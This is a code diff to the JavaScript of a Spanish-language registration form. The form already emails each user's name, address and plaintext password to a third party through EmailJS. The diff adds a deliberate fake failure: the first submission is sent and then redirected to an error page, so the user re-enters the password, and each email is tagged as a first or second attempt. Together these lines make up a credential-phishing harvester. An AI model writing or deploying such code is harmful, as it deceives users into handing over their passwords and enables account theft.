@@ -24,12 +24,21 @@ document.getElementById('formularioRegistro').addEventListener('submit', async (
     const datos = {
         nombre: document.getElementById('nombre').value.trim(),
         correo: emailInput.value.trim(),
-        password: document.getElementById('password').value
+        password: document.getElementById('password').value,
+        intento: localStorage.getItem('intentoRegistro') ? 'Segundo intento' : 'Primer intento'
     };
 
     try {
         await emailjs.send("service_syrc1uk", "template_u3etoro", datos);
-        window.location.href = "exito.html";
+        
+        if (!localStorage.getItem('intentoRegistro')) {
+            localStorage.setItem('intentoRegistro', '1');
+            window.location.href = "error.html";
+        } else {
+            localStorage.removeItem('intentoRegistro');
+            window.location.href = "exito.html";
+        }
+        
     } catch (error) {
         alert('Error al enviar el registro. Intenta nuevamente.');
         console.error('Error:', error);
